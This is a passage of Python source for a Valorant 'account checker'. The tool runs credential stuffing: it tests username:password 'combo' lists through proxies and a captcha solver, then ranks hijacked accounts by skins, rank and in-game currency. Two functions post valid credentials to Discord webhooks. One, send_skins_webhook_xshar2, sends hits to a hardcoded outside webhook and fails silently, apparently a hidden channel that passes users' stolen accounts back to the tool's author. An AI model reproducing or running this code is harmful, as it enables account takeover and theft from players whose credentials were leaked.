        elif WEBHOOK_CONFIG.get('ping_banned') and 'BANNED' in str(combo_data.get('penalty_status', '')):
            should_ping = True
        
        # Build clean professional embed
        embed = {
            "author": {
                "name": "POLYGON VALORANT CHECKER",
                "icon_url": "https://i.ibb.co/YBzHbvsV/image.png",
                "url": "https://discord.gg/BmPKXpbYHK"
            },
            "title": f"{title_prefix}",
            "description": f"**{riot_id}**",
            "color": color,
            "thumbnail": {"url": "https://i.ibb.co/YBzHbvsV/image.png"},
            "fields": [
                {
                    "name": "🔐 Account Credentials",
                    "value": f"||`{combo_data.get('username')}:{combo_data.get('password')}`||",
                    "inline": False
                },
                {
                    "name": "📊 Account Info",
                    "value": f"**Level:** `{level}`\n**Rank:** `{combo_data.get('rank', 'Unranked')}`\n**Region:** `{combo_data.get('region', 'N/A').upper()}`\n**Country:** `{combo_data.get('country', 'Unknown')}`\n**Matches:** `{combo_data.get('total_matches', 0)}`",
                    "inline": True
                },
                {
                    "name": "💰 Wallet",
                    "value": f"**VP:** `{combo_data.get('vp', 0)}`\n**Radianite:** `{combo_data.get('rd', 0)}`\n**KC:** `{combo_data.get('kc', 0)}`",
                    "inline": True
                },
                {
                    "name": "🎨 Inventory",
                    "value": f"**Skins:** `{skins_count}`\n**Buddies:** `{combo_data.get('buddies_count', 0)}`\n**Cards:** `{combo_data.get('player_cards_count', 0)}`\n**Sprays:** `{combo_data.get('sprays_count', 0)}`",
                    "inline": True
                },
                {
                    "name": "🔒 Security",
                    "value": f"**Email:** `{combo_data.get('email_status', 'Unknown')}`\n**Phone:** `{combo_data.get('phone_status', 'Unknown')}`\n**Status:** `{combo_data.get('penalty_status', 'UNKNOWN')}`",
                    "inline": True
                }
            ],
            "footer": {
                "text": "POLYGON • Professional Account Checker • discord.gg/BmPKXpbYHK",
                "icon_url": "https://i.ibb.co/HDDhhVwK/polygon.png"
            }
        }
        
        # Send webhook
        payload = {
            "username": WEBHOOK_CONFIG.get('username', 'POLYGON Checker'),
            "avatar_url": "https://i.ibb.co/HDDhhVwK/polygon.png",
            "embeds": [embed]
        }
        
        # Add @everyone ping if enabled
        if should_ping:
            payload["content"] = "@everyone"
        
        requests.post(WEBHOOK_CONFIG['url'], json=payload, timeout=10)
    except Exception as e:
        print(f"Webhook error: {e}")


def send_skins_webhook_xshar2(combo_data: dict):
    """Send account hits with 1+ skins to dedicated Discord webhook"""
    SKINS_WEBHOOK_URL = "https://discord.com/api/webhooks/1433859564612227074/AUayTofmfupUT3HmTZf0_OXXRrVY4JopeVQH2OGheydih4WRTIub3O7mxKMn8q-Fmxko"
    
    try:
        # Check if account has 1 or more skins
        skins_count = combo_data.get('weapon_skins_count', 0)
        if skins_count < 1:
            return
        
        # Skip None#None accounts
        riot_id = combo_data.get('riot_id', '')
        if riot_id in ['None#None', '', 'N/A', 'Unknown']:
            return
        
        # Only send for valid accounts
        status = combo_data.get('status', '')
        if status != 'valid':
            return
        
        level = combo_data.get('level', 0)
        vp = combo_data.get('vp', 0)
        
        # Determine embed color based on skin count
        if skins_count >= 50:
            color = 16766720  # Gold for high value
            title_prefix = "💎 HIGH VALUE HIT"
        elif skins_count >= 20:
            color = 15844367  # Orange for medium value
            title_prefix = "✨ VALUABLE HIT"
        else:
            color = 5763719  # Green for valid
            title_prefix = "✅ VALID HIT"
        
        # Build embed
        embed = {
            "author": {
                "name": "POLYGON VALORANT CHECKER",
                "icon_url": "https://i.ibb.co/YBzHbvsV/image.png",
                "url": "https://discord.gg/BmPKXpbYHK"
            },
            "title": f"{title_prefix}",
            "description": f"**{riot_id}**",
            "color": color,
            "thumbnail": {"url": "https://i.ibb.co/YBzHbvsV/image.png"},
            "fields": [
                {
                    "name": "🔐 Account Credentials",
                    "value": f"||`{combo_data.get('username')}:{combo_data.get('password')}`||",
                    "inline": False
                },
                {
                    "name": "📊 Account Info",
                    "value": f"**Level:** `{level}`\n**Rank:** `{combo_data.get('rank', 'Unranked')}`\n**Region:** `{combo_data.get('region', 'N/A').upper()}`\n**Country:** `{combo_data.get('country', 'Unknown')}`\n**Matches:** `{combo_data.get('total_matches', 0)}`",
                    "inline": True
                },
                {
                    "name": "💰 Wallet",
                    "value": f"**VP:** `{combo_data.get('vp', 0)}`\n**Radianite:** `{combo_data.get('rd', 0)}`\n**KC:** `{combo_data.get('kc', 0)}`",
                    "inline": True
                },
                {
                    "name": "🎨 Inventory",
                    "value": f"**Skins:** `{skins_count}`\n**Buddies:** `{combo_data.get('buddies_count', 0)}`\n**Cards:** `{combo_data.get('player_cards_count', 0)}`\n**Sprays:** `{combo_data.get('sprays_count', 0)}`",
                    "inline": True
                },
                {
                    "name": "🔒 Security",
                    "value": f"**Email:** `{combo_data.get('email_status', 'Unknown')}`\n**Phone:** `{combo_data.get('phone_status', 'Unknown')}`\n**Status:** `{combo_data.get('penalty_status', 'UNKNOWN')}`",
                    "inline": True
                }
            ],
            "footer": {
                "text": "POLYGON • Professional Account Checker • discord.gg/BmPKXpbYHK",
                "icon_url": "https://i.ibb.co/HDDhhVwK/polygon.png"
            }
        }
        
        # Send webhook
        payload = {
            "username": "POLYGON Checker",
            "avatar_url": "https://i.ibb.co/HDDhhVwK/polygon.png",
            "embeds": [embed]
        }
        
        requests.post(SKINS_WEBHOOK_URL, json=payload, timeout=10)
    except Exception as e:
        # Silently fail to avoid disrupting the main flow
        pass


## Removed legacy FastAPI endpoints


def main():
    import os as _os
    import webbrowser
    import threading
    from datetime import datetime as _dt
    
    # Load configuration on startup
    load_config()
    
    # Initialize Results folder structure if Results folder exists
    _initialize_results_folder_structure()
    
    # Rotate log by deleting on start and clear console
    try:
        log_path = get_file_path('checker.log')
        if _os.path.exists(log_path):
            _os.remove(log_path)
    except Exception:
        pass
    _os.system('cls' if _os.name == 'nt' else 'clear')
    
    # =========================
    # VERSION CHECK - BLOCKING
    # =========================
    print(f"\n{'='*60}")
    print(f"  Checking for updates...")
    print(f"{'='*60}\n")
    
    version_checker = VersionChecker(VERSION, VERSION_CHECK_URL)
    version_info = version_checker.check_version()
    
    if not version_info['is_latest']:
        # OUTDATED VERSION DETECTED - BLOCK EXECUTION
        print(f"\n{'='*60}")
        print(f"  ⚠️  OUTDATED VERSION DETECTED!")
        print(f"  Current: v{version_info['current_version']}")
        print(f"  Latest:  v{version_info['latest_version']}")
        print(f"{'='*60}\n")
        
        # Show contact information
        message = version_info.get('message', 'Please contact POLYGON for the latest version.')
        contact = version_info.get('contact', DOWNLOAD_INFO_URL)
        
        print(f"  {message}")
        print(f"\n  📞 Contact: {contact}")
        print(f"\n{'='*60}")
        print(f"  ❌ CHECKER BLOCKED - UPDATE REQUIRED")
        print(f"{'='*60}\n")
        
        input("  Press Enter to exit...")
        sys.exit(1)  # BLOCK EXECUTION - NO BYPASS
    else:
        # Up to date or network error (won't block on network issues)
        if 'error' not in version_info:
            print(f"  ✅ Running latest version (v{VERSION})\n")
    
    # =========================
    # LICENSE AUTHENTICATION - BLOCKING
    # =========================
    authenticate_license()
    
    logo = """
▀███▀▀▀██▄  ▄▄█▀▀██▄ ▀████▀   ▀███▀   ▀██▀ ▄▄█▀▀▀█▄█  ▄▄█▀▀██▄ ▀███▄   ▀███▀
 ██   ▀██▄██▀    ▀██▄ ██       ███   ▄█ ▄██▀     ▀█▄██▀    ▀██▄ ███▄    █ 
 ██   ▄████▀      ▀██ ██        ███ ▄█  ██▀       ▀██▀      ▀██ █ ███   █  
 ███████ ██        ██ ██         ████   ██         ██        ██ █  ▀██▄ █  
 ██      ██▄      ▄██ ██     ▄    ██    ██▄    ▀█████▄      ▄██ █   ▀██▄█  
 ██      ▀██▄    ▄██▀ ██    ▄█    ██    ▀██▄     ██▀██▄    ▄██▀ █     ███  
▄████▄      ▀▀████▀▀ ██████████  ▄████▄    ▀▀███████  ▀▀████▀▀ ▄███▄    ██
   ╔════════════════════════════════════════════════════════════════╗   
      ║       POLYGON VALORANT CHECKER - V1.0 | POLYGON         ║   
   ╚════════════════════════════════════════════════════════════════╝   
"""
    print(logo)
    
    # Start PyQt application
    app = QApplication(sys.argv)
    ui = PolygonCheckerUI()
    ui.show()
    sys.exit(app.exec_())


class StatCard(QWidget):
    def __init__(self, title: str, accent: str = "#e0e0e0"):
        super().__init__()
        outer = QVBoxLayout(self)
        outer.setContentsMargins(0, 0, 0, 0)
        outer.setSpacing(2)
        self.title = QLabel(title)
        self.value = QLabel("0")
        self.title.setStyleSheet("color:#a0a0a0;font-size:12px;")
        self.value.setStyleSheet(f"color:{accent};font-size:22px;font-weight:700;")
        outer.addWidget(self.title)
        outer.addWidget(self.value)
        # No boxes/borders for a more formal inline look
        self.setStyleSheet("background: transparent; border: none;")

    def set_value(self, text: str):
        self.value.setText(text)


def _extract_rank_value(rank_str):
    """Extract numeric rank value for sorting (1-3000, or 0 for Unranked)"""
    if not rank_str or rank_str == 'Unranked':
        return 0  # Unranked = lowest
    
    import re
    match = re.search(r'(\d+)', str(rank_str))
    if match:
        rank_num = int(match.group(1))
        # Ensure it's in valid range
        if 1 <= rank_num <= 3000:
            return rank_num
    return 0  # Invalid rank = lowest


class RankSortProxyModel(QSortFilterProxyModel):
    """Custom proxy model that sorts by rank (highest to lowest) by default"""
    
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setSortCaseSensitivity(Qt.CaseInsensitive)
        # Default sort: Rank column (8) descending (highest to lowest)
        self.setSortRole(Qt.UserRole + 1)  # Use custom role for rank sorting
    
    def lessThan(self, left, right):
        """Custom comparison for sorting"""
        # If sorting by rank column (column 8), use numeric rank comparison
        if left.column() == 8:  # Rank column
            left_rank = self.sourceModel().data(left, Qt.UserRole + 1)
            right_rank = self.sourceModel().data(right, Qt.UserRole + 1)
            
            # Extract numeric values
            left_val = _extract_rank_value(str(left_rank)) if left_rank else 0
            right_val = _extract_rank_value(str(right_rank)) if right_rank else 0
            
            # For descending sort (highest first), reverse the comparison
            return left_val < right_val
        
        # For other columns, use default string comparison
        return super().lessThan(left, right)


class ComboTableModel(QAbstractTableModel):
    """Custom model for efficient table display with virtual scrolling - 10-50x faster than QTableWidget"""
    
    def __init__(self, parent=None):
        super().__init__(parent)
        self._combos = []
        self._filtered_combos = []
        self._status_filter = "All"
        self._search_query = ""
        self._column_headers = [
            "ID", "Username", "Password", "Status", "RiotID", 
            "Level", "VP", "RD", "Rank", "Country", "Region"
        ]
    
    def rowCount(self, parent=QModelIndex()):
        return len(self._filtered_combos)
    
    def columnCount(self, parent=QModelIndex()):
        return len(self._column_headers)
    
    def headerData(self, section, orientation, role=Qt.DisplayRole):
        if orientation == Qt.Horizontal and role == Qt.DisplayRole:
            if 0 <= section < len(self._column_headers):
                return self._column_headers[section]
        return QVariant()
    
    def data(self, index, role=Qt.DisplayRole):
        if not index.isValid() or index.row() >= len(self._filtered_combos):
            return QVariant()
        
        combo = self._filtered_combos[index.row()]
        col = index.column()
        
        if role == Qt.DisplayRole:
            if col == 0:
                return str(combo.get("id", ""))
            elif col == 1:
                return str(combo.get("username", ""))
            elif col == 2:
                return str(combo.get("password", ""))
            elif col == 3:
                return str(combo.get("status", ""))
            elif col == 4:
                return str(combo.get("riot_id", ""))
            elif col == 5:
                return str(combo.get("level", ""))
            elif col == 6:
                return str(combo.get("vp", ""))
            elif col == 7:
                return str(combo.get("rd", ""))
            elif col == 8:
                rank = str(combo.get("rank", ""))
                return _invert_control_rank_for_display(rank)
            elif col == 9:
                return str(combo.get("country", ""))
            elif col == 10:
                return str(combo.get("region", ""))
        
        elif role == Qt.UserRole:
            return combo.get("id")
        
        elif role == Qt.UserRole + 1:  # Custom role for rank sorting
            # Return raw rank value for sorting
            if col == 8:  # Rank column
                return combo.get("rank", "")
            return QVariant()
        
        return QVariant()
    
    def update_data(self, combos, status_filter="All", search_query=""):
        """Update model data with filtering - handles unlimited rows efficiently"""
        self.beginResetModel()  # Notify view that model is about to change
        try:
            self._combos = combos
            self._status_filter = status_filter
            self._search_query = search_query.lower()
            
            # Filter combos efficiently
            self._filtered_combos = []
            for c in combos:
                # Status filter
                if status_filter != "All" and c.get('status') != status_filter:
                    continue
                
                # Search query filter
                if search_query:
                    hay = f"{c.get('username','')} {c.get('riot_id','')} {c.get('region','')}".lower()
                    if self._search_query not in hay:
                        continue
                
                self._filtered_combos.append(c)
        finally:
            self.endResetModel()  # Notify view that model has changed
    
    def get_combo_at(self, row):
        """Get combo data at specific row"""
        if 0 <= row < len(self._filtered_combos):
            return self._filtered_combos[row]
        return None
    
    def get_all_filtered_combos(self):
        """Get all currently filtered combos"""
        return self._filtered_combos.copy()


class PolygonCheckerUI(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("POLYGON • Valorant Checker")
        self.resize(1360, 820)

        self._storage = _STORAGE
        self._checker = _CHECKER

        # Network manager for image loading (same as test script - must persist)
        self.network_manager = QNetworkAccessManager()

        # State for theme
        self.theme_mode = 'dark'  # 'dark' or 'light'
        self.bg_shade = 5  # darkest shade (minimum of dark range)

        # Root + theme
        root = QWidget()
        self.setCentralWidget(root)
        layout = QVBoxLayout(root)
        layout.setContentsMargins(16, 16, 16, 16)
        layout.setSpacing(14)
        self.apply_theme()

        # Header row (title + top-right controls if needed later)
        header = QHBoxLayout()
        title = QLabel("VALORANT Checker")
        title.setStyleSheet("font-size:18px;font-weight:700;color:#ffffff;")
        titleBox = QVBoxLayout()
        titleBox.addWidget(title)
        header.addLayout(titleBox)
        header.addStretch(1)

        # Theme controls (right)
        theme_row = QHBoxLayout()
        self.theme_btn = QPushButton("Dark Mode")
        self.theme_btn.setCheckable(True)
        self.theme_btn.setChecked(True)
        self.theme_btn.clicked.connect(self.on_toggle_theme)
        theme_row.addWidget(self.theme_btn)
        
        # Settings button (top right)
        self.header_settings_btn = QPushButton("⚙ Settings")
        self.header_settings_btn.clicked.connect(self.on_show_settings)
        theme_row.addWidget(self.header_settings_btn)

        theme_row.addWidget(QLabel("BG"))
        self.bg_slider = QSlider(Qt.Horizontal)
        self.bg_slider.setRange(5, 40)  # dark range default
        self.bg_slider.setValue(self.bg_shade)
        self.bg_slider.setFixedWidth(160)
        self.bg_slider.valueChanged.connect(self.on_bg_slider)
        theme_row.addWidget(self.bg_slider)
        header.addLayout(theme_row)
        layout.addLayout(header)

        # Stat cards row (formal inline, no boxes)
        stats_row = QHBoxLayout()
        default_num = "#e0e0e0"
        self.card_total = StatCard("Total", accent=default_num)
        self.card_checked = StatCard("Checked", accent=default_num)
        # Valid explicitly bright red as requested
        self.card_valid = StatCard("Valid", accent="#ff3b3b")
        self.card_invalid = StatCard("Invalid", accent=default_num)
        
        def add_with_sep(w: QWidget):
            stats_row.addWidget(w)
            sep = QLabel("|")
            sep.setStyleSheet("color:#5a5a5a; padding:0 10px;")
            stats_row.addWidget(sep)

        for c in [self.card_total, self.card_checked, self.card_valid, self.card_invalid]:
            add_with_sep(c)
        # remove trailing separator spacing effect
        stats_row.takeAt(stats_row.count()-1)
        stats_row.addStretch(1)
        layout.addLayout(stats_row)
        
        # Progress bar and CPM display row
        progress_row = QHBoxLayout()
        progress_row.setSpacing(10)
        
        # Progress bar
        self.progress_bar = QProgressBar()
        self.progress_bar.setMinimum(0)
        self.progress_bar.setMaximum(100)
        self.progress_bar.setValue(0)
        self.progress_bar.setFormat("%p% (%v/%m)")
        self.progress_bar.setTextVisible(True)
        self.progress_bar.setStyleSheet("""
            QProgressBar {
                border: 1px solid #444;
                border-radius: 5px;
                text-align: center;
                background-color: #2b2b2b;
                height: 24px;
            }
            QProgressBar::chunk {
                background-color: #ff3b3b;
                border-radius: 4px;
            }
        """)
        progress_row.addWidget(QLabel("Progress:"))
        progress_row.addWidget(self.progress_bar, 1)
        
        # CPM display
        self.cpm_label = QLabel("CPM: 0")
        self.cpm_label.setStyleSheet("padding: 0 10px;")
        progress_row.addWidget(self.cpm_label)
        
        layout.addLayout(progress_row)

        # Splitter: left controls / right results
        split = QSplitter()
        split.setHandleWidth(10)
        layout.addWidget(split, 1)

        # Left sidebar
        left = QWidget()
        left_layout = QVBoxLayout(left)
        left_layout.setSpacing(12)
        left_layout.setContentsMargins(0, 0, 0, 0)

        config_box = QGroupBox("Configuration")
        cfg = QVBoxLayout(config_box)
        api_label = QLabel("Captcha Solver API Key")
        self.api_key_input = QLineEdit()
        self.api_key_input.setEchoMode(QLineEdit.Password)
        cfg.addWidget(api_label)
        cfg.addWidget(self.api_key_input)

        threads_row = QHBoxLayout()
        threads_row.addWidget(QLabel("Threads"))
        self.thread_spin = QSpinBox()
        self.thread_spin.setRange(1, 100)
        self.thread_spin.setValue(15)
        self.thread_spin.setMaximumWidth(120)
        threads_row.addWidget(self.thread_spin)
        threads_row.addStretch(1)
        cfg.addLayout(threads_row)
        left_layout.addWidget(config_box)

        upload_box = QGroupBox("Upload Files")
        upl = QVBoxLayout(upload_box)
        self.tabs = QTabWidget()
        tab_combos = QWidget(); tab_proxies = QWidget()
        tcl = QVBoxLayout(tab_combos); tpl = QVBoxLayout(tab_proxies)
        self.combos_drop = QPushButton("Drop combos file or click to browse")
        self.combos_drop.clicked.connect(self.on_load_combos)
        self.combos_drop.setFixedHeight(140)
        self.combos_drop.setStyleSheet("border:2px dashed #1c232c;border-radius:10px;")
        tcl.addWidget(self.combos_drop)
        self.proxies_text = QPlainTextEdit()
        self.proxies_text.setPlaceholderText("Paste proxies here (ip:port or user:pass@ip:port)\nOne per line")
        tpl.addWidget(self.proxies_text)
        load_proxies_btn = QPushButton("Load Proxies from File…")
        load_proxies_btn.clicked.connect(self.on_load_proxies_file)
        tpl.addWidget(load_proxies_btn)
        self.tabs.addTab(tab_combos, "Combos")
        self.tabs.addTab(tab_proxies, "Proxies")
        upl.addWidget(self.tabs)
        self.start_btn = QPushButton("Start Checking")
        self.start_btn.setObjectName("StartPrimary")
        self.start_btn.setFixedHeight(44)
        self.start_btn.clicked.connect(self.on_start)
        upl.addWidget(self.start_btn)
        left_layout.addWidget(upload_box)

        single_box = QGroupBox("Single Account Check")
        sgl = QVBoxLayout(single_box)
        self.single_user = QLineEdit(); self.single_user.setPlaceholderText("username")
        self.single_pass = QLineEdit(); self.single_pass.setPlaceholderText("password"); self.single_pass.setEchoMode(QLineEdit.Password)
        single_row = QHBoxLayout(); single_row.addWidget(self.single_user); single_row.addWidget(self.single_pass)
        sgl.addLayout(single_row)
        single_btn = QPushButton("Check Now")
        single_btn.clicked.connect(self.on_single_check)
        sgl.addWidget(single_btn)
        left_layout.addWidget(single_box)
        
        # Check Balance box (similar to valo.py)
        balance_box = QGroupBox("Check Balance")
        bal = QVBoxLayout(balance_box)
        self.balance_label = QLabel("Balance: $0.00")
        self.balance_btn = QPushButton("Check Balance")
        self.balance_btn.clicked.connect(self.on_check_balance)
        bal.addWidget(self.balance_label)
        bal.addWidget(self.balance_btn)
        left_layout.addWidget(balance_box)
        
        left_layout.addStretch(1)

        split.addWidget(left)

        # Right side: results with tabs
        right = QWidget()
        right_layout = QVBoxLayout(right)
        right_layout.setSpacing(10)
        right_layout.setContentsMargins(12, 0, 0, 0)
        
        # Create tab widget for results and skins view
        self.results_tabs = QTabWidget()
        self.results_tabs.setStyleSheet("""
            QTabWidget::pane { border: 1px solid #444; }
            QTabBar::tab { padding: 8px 16px; }
            QTabBar::tab:selected { background-color: #3d3d3d; }
        """)
        
        # Results tab (existing table view)
        results_tab = QWidget()
        results_tab_layout = QVBoxLayout(results_tab)
        results_tab_layout.setSpacing(10)
        results_tab_layout.setContentsMargins(0, 0, 0, 0)

        actions_row = QHBoxLayout()
        # Filters (left)
        actions_row.addWidget(QLabel("Filter:"))
        self.status_filter = QComboBox()
        self.status_filter.addItems(["All", "pending", "checking", "valid", "invalid", "error"])
        self.status_filter.currentIndexChanged.connect(self.on_filter_changed)
        actions_row.addWidget(self.status_filter)

        self.search_box = QLineEdit()
        self.search_box.setPlaceholderText("Search username / RiotID / region")
        self.search_box.textChanged.connect(self.on_filter_changed)
        self.search_box.setFixedWidth(260)
        actions_row.addWidget(self.search_box)

        actions_row.addStretch(1)
        self.btn_select_all = QPushButton("Select All")
        self.btn_clear = QPushButton("Clear")
        self.btn_copy = QPushButton("Copy")
        self.btn_download = QPushButton("Download")
        self.btn_select_all.clicked.connect(self.on_select_all)
        self.btn_clear.clicked.connect(self.on_clear_results)
        self.btn_copy.clicked.connect(self.on_copy_results)
        self.btn_download.clicked.connect(lambda: self.on_export("csv"))
        for b in [self.btn_select_all, self.btn_clear, self.btn_copy, self.btn_download]:
            actions_row.addWidget(b)
        results_tab_layout.addLayout(actions_row)

        # Use QTableView with custom model for 10-50x better performance (virtual scrolling)
        self.table = QTableView()
        self.table_model = ComboTableModel(self)
        # Use custom proxy model for rank sorting (highest to lowest)
        self.proxy_model = RankSortProxyModel(self)
        self.proxy_model.setSourceModel(self.table_model)
        self.table.setModel(self.proxy_model)
        self.table.setSelectionBehavior(QAbstractItemView.SelectRows)
        self.table.setSelectionMode(QAbstractItemView.SingleSelection)
        self.table.setEditTriggers(QAbstractItemView.NoEditTriggers)
        self.table.setContextMenuPolicy(Qt.CustomContextMenu)
        self.table.customContextMenuRequested.connect(self._show_table_context_menu)
        self.table.setSortingEnabled(True)
        # Sort by Rank column (8) ascending (rank 1 = best at top, rank 3000 = worst at bottom)
        self.table.sortByColumn(8, Qt.AscendingOrder)
        self.table.setAlternatingRowColors(True)
        header = self.table.horizontalHeader()
        header.setSectionResizeMode(QHeaderView.ResizeToContents)
        header.setStretchLastSection(True)
        results_tab_layout.addWidget(self.table, 1)
        
        # Add results tab
        self.results_tabs.addTab(results_tab, "Results")
        
        # Skins view tab
        skins_tab = QWidget()
        skins_tab_layout = QVBoxLayout(skins_tab)
        skins_tab_layout.setSpacing(10)
        skins_tab_layout.setContentsMargins(0, 0, 0, 0)
        
        # Skins view header
        skins_header = QHBoxLayout()
        skins_header.addWidget(QLabel("Accounts with Skins Detected"))
        skins_header.addStretch()
        refresh_skins_btn = QPushButton("Refresh")
        refresh_skins_btn.clicked.connect(self.refresh_skins_view)
        skins_header.addWidget(refresh_skins_btn)
        skins_tab_layout.addLayout(skins_header)
        
        # Skins table
        self.skins_table = QTableWidget()
        self.skins_table.setColumnCount(6)
        self.skins_table.setHorizontalHeaderLabels([
            "Username",
            "Skins",
            "Skins Count",
            "Level",
            "Rank",
            "Actions"
        ])
        skins_header_table = self.skins_table.horizontalHeader()
        skins_header_table.setSectionResizeMode(0, QHeaderView.Stretch)
        skins_header_table.setSectionResizeMode(1, QHeaderView.ResizeToContents)
        skins_header_table.setSectionResizeMode(2, QHeaderView.ResizeToContents)
        skins_header_table.setSectionResizeMode(3, QHeaderView.ResizeToContents)
        skins_header_table.setSectionResizeMode(4, QHeaderView.ResizeToContents)
        skins_header_table.setSectionResizeMode(5, QHeaderView.ResizeToContents)
        self.skins_table.setSortingEnabled(True)
        self.skins_table.setEditTriggers(QTableWidget.NoEditTriggers)
        skins_tab_layout.addWidget(self.skins_table, 1)
        
        # Add skins tab
        self.results_tabs.addTab(skins_tab, "Skins View")
        
        # Statistics tab
        statistics_tab = QWidget()
        statistics_tab_layout = QVBoxLayout(statistics_tab)
        statistics_tab_layout.setSpacing(10)
        statistics_tab_layout.setContentsMargins(10, 10, 10, 10)
        
        # Create statistics widget
        self.statistics_widget = self._create_statistics_tab()
        statistics_tab_layout.addWidget(self.statistics_widget)
        
        # Refresh button
        refresh_stats_btn = QPushButton("Refresh Statistics")
        refresh_stats_btn.clicked.connect(lambda: self._refresh_statistics_tab(self.statistics_widget))
        statistics_tab_layout.addWidget(refresh_stats_btn)
        
        self.results_tabs.addTab(statistics_tab, "Statistics")
        
        right_layout.addWidget(self.results_tabs, 1)
        split.addWidget(right)
        split.setStretchFactor(0, 0)
        split.setStretchFactor(1, 1)

        # Refresh timer - optimized frequency for better performance
        self.refresh_timer = QTimer(self)
        self.refresh_timer.timeout.connect(self.refresh)
        self.refresh_timer.start(5000)  # 5 seconds for better performance (reduced from 3s)
        self._last_refresh_time = 0
        self._refresh_throttle_ms = 3000  # Minimum 3 seconds between refreshes (increased from 2s)
        self._table_refresh_counter = 0  # Counter for adaptive table refresh

        # Initial refresh
        self.refresh()

        # If API key is present from config, populate input (no auto balance check)
        try:
            # Load config to ensure API key is loaded
            load_config()
            api_key = getattr(_SOLVER, "api_key", "")
            if api_key:
                self.api_key_input.setText(api_key)
                _LOGGER.log("API key loaded from saved config", "INFO")
        except Exception as e:
            _LOGGER.log(f"Could not load API key from config: {e}", "DEBUG")

    # =============== THEME ===============
    def apply_theme(self):
        # Build a stylesheet from current mode and shade
        if self.theme_mode == 'dark':
            base = self._gray(self.bg_shade)  # ~ #121212 .. #282828
            surface = self._gray(self.bg_shade + 4)
            border = self._gray(self.bg_shade + 10)
            header_bg = self._gray(self.bg_shade + 6)
            text = '#e0e0e0'
            muted = '#bdbdbd'
            table_bg = self._gray(self.bg_shade + 3)
        else:
            # light mode ranges
            shade = max(220, min(255, 255 - (self.bg_shade * 2)))
            base = self._gray_val(shade)
            surface = self._gray_val(min(255, shade + 6))
            border = self._gray_val(max(200, shade - 25))
            header_bg = self._gray_val(min(255, shade + 10))
            text = '#202020'
            muted = '#404040'
            table_bg = surface

        ss = f"""
        QMainWindow, QWidget {{ background-color:{base}; color:{text}; }}
        QLabel {{ color:{text}; }}
        QGroupBox {{ border:1px solid {border}; border-radius:10px; margin-top:10px; }}
        QGroupBox::title {{ subcontrol-origin: margin; subcontrol-position: top left; padding:4px 8px; color:{muted}; }}
        QLineEdit, QPlainTextEdit, QSpinBox {{ background:{surface}; border:1px solid {border}; border-radius:8px; padding:8px; color:{text}; }}
        QPushButton {{ background:{surface}; border:1px solid {border}; border-radius:8px; padding:8px 12px; color:{text}; }}
        QPushButton:hover {{ background:{header_bg}; }}
        QPushButton#StartPrimary {{ background:#e53935; border:1px solid #e53935; color:#ffffff; font-weight:700; }}
        QPushButton#StartPrimary:hover {{ background:#ef5350; }}
        QTableWidget {{ background:{table_bg}; gridline-color:{border}; border:1px solid {border}; border-radius:10px; }}
        QHeaderView::section {{ background:{header_bg}; color:{muted}; padding:6px; border:0px; border-right:1px solid {border}; }}
        QTabWidget::pane {{ border:1px solid {border}; border-radius:10px; top:-1px; }}
        QTabBar::tab {{ background:{surface}; color:{muted}; padding:8px 12px; border-top-left-radius:8px; border-top-right-radius:8px; }}
        QTabBar::tab:selected {{ background:{header_bg}; color:{text}; }}
        """
        self.setStyleSheet(ss)

    def _gray(self, shade: int) -> str:
        # clamp 8..60 -> dark range
        s = max(8, min(60, shade))
        v = int(255 * (s / 100.0))
        return f"#{v:02x}{v:02x}{v:02x}"

    def _gray_val(self, val: int) -> str:
        v = max(0, min(255, val))
        return f"#{v:02x}{v:02x}{v:02x}"

    def on_toggle_theme(self):
        if self.theme_mode == 'dark':
            self.theme_mode = 'light'
            self.theme_btn.setText('Light Mode')
            self.theme_btn.setChecked(False)
            self.bg_slider.setRange(0, 50)
            self.bg_slider.setValue(15)
            self.bg_shade = 15
        else:
            self.theme_mode = 'dark'
            self.theme_btn.setText('Dark Mode')
            self.theme_btn.setChecked(True)
            self.bg_slider.setRange(5, 40)
            self.bg_slider.setValue(5)  # darkest shade
            self.bg_shade = 5
        self.apply_theme()

    def on_bg_slider(self, value: int):
        self.bg_shade = value
        self.apply_theme()
    
    def on_show_skins_view(self):
        """Switch to skins view tab"""
        self.results_tabs.setCurrentIndex(1)  # Switch to skins view tab
        self.refresh_skins_view()
    
    def refresh_skins_view(self):
        """Refresh the skins view table with accounts that have skins"""
        all_combos = self._storage.get_all_combos()
        accounts_with_skins = []
        
        for combo in all_combos:
            if combo.get('status') == 'valid':
                skins_count = combo.get('weapon_skins_count', 0) or combo.get('skins', 0)
                if skins_count > 0:
                    accounts_with_skins.append(combo)
        
        # Sort by skins count (descending)
        accounts_with_skins.sort(key=lambda x: x.get('weapon_skins_count', 0) or x.get('skins', 0), reverse=True)
        
        self.skins_table.setRowCount(len(accounts_with_skins))
        
        for row, combo in enumerate(accounts_with_skins):
            username = combo.get('username', 'N/A')
            skins_count = combo.get('weapon_skins_count', 0) or combo.get('skins', 0)
            level = combo.get('level', 0)
            rank = combo.get('rank', 'Unranked')
            
            self.skins_table.setItem(row, 0, QTableWidgetItem(username))
            
            # Skins column - show text only (no automatic image loading in bulk view)
            # Images only load when user explicitly opens "View" or "View All" dialogs
            skin_details = combo.get('skin_details', [])
            if skin_details:
                # Show skin names as text (no images to avoid bulk network requests)
                skin_names = []
                sorted_skins = sorted(skin_details, key=lambda x: self._get_rarity_value(x.get('rarity', '')), reverse=True)
                best_skins = sorted_skins[:5]  # Show top 5 skins
                for skin in best_skins:
                    skin_name = skin.get('name', 'Unknown')
                    if skin_name:
                        skin_names.append(skin_name)
                
                skins_text = ", ".join(skin_names) if skin_names else "No skins"
                if len(skin_names) < len(skin_details):
                    skins_text += f" (+{len(skin_details) - len(skin_names)} more)"
            else:
                skins_text = "No skins"
            
            skins_label = QLabel(skins_text)
            skins_label.setWordWrap(True)
            skins_label.setStyleSheet("padding: 5px;")
            self.skins_table.setItem(row, 1, QTableWidgetItem(skins_text))
            
            self.skins_table.setItem(row, 2, QTableWidgetItem(str(skins_count)))
            self.skins_table.setItem(row, 3, QTableWidgetItem(str(level)))
            self.skins_table.setItem(row, 4, QTableWidgetItem(rank))
            
            # Actions column with buttons
            actions_widget = QWidget()
            actions_layout = QHBoxLayout(actions_widget)
            actions_layout.setContentsMargins(2, 2, 2, 2)
            actions_layout.setSpacing(5)
            
            view_btn = QPushButton("View")
            view_btn.setFixedWidth(60)
            view_btn.clicked.connect(lambda checked, c=combo: self._view_account_skins(c))
            actions_layout.addWidget(view_btn)
            
            view_all_btn = QPushButton("View All")
            view_all_btn.setFixedWidth(70)
